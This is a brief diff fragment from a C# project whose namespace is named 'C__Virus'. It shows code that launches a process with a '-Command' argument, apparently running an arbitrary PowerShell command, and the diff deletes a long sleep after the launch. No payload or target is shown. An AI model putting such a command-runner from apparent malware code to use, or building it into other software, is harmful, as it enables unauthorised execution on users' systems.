@@ -52,7 +52,6 @@ namespace C__Virus
                         startInfo.Arguments = $"-Command \"{Command}\"";
                         process.StartInfo = startInfo;
                         process.Start();
-                        Thread.Sleep(100000);
                     }
                     else
                     {
